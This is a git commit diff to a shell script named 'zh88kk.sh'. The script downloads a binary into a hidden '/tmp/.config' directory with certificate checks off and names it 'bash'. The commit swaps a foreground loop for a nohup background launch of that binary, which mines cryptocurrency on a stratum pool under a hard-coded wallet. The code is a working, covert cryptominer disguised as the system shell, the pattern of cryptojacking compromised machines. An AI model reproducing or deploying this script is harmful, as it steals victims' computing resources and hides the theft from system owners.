b37a7173e2e229c06fcf54d634ed074093f856bc
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-05 19:10:20 +0800

    Update zh88kk.sh

--- zh88kk.sh
+++ zh88kk.sh
@@ -6,7 +6,8 @@ wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curio
 chmod -R  777 /tmp/.config
 
 #!/bin/sh
-while [ 1 ]; do
-	/tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a
-	sleep 5
-done
+#while [ 1 ]; do
+#	/tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a
+#	sleep 5
+#done
+nohup /tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a > sleep.log &
